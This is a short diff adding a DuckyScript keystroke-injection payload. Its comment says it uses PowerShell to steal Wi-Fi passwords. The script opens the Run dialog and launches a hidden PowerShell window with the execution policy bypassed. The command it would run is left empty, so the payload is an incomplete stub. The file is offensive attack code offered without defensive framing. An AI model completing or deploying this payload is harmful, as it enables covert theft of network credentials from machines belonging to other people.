@@ -1,0 +1,9 @@
+REM comment using powershell steal wifi pass
+
+DEFAULT_DELAY 100
+
+GUI + R
+DELAY 500
+STRING powershell -NoP -Ep Bypass -W H -C 
+DELAY 300
+ENTER
